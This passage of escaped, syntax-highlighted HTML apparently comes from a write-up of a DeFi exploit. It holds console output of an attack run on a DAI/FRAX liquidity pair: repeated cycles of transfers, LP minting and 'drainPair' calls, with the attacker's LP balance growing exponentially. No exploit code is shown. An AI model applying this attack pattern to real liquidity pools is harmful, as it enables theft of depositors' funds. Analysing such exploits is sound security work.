class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e50000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e50000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e250000100000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e250000100000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1250000750000150000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1250000750000150000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6250005000001500000200000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6250005000001500000200000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e31250031250012500002500000250000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e31250031250012500002500000250000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e7\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan 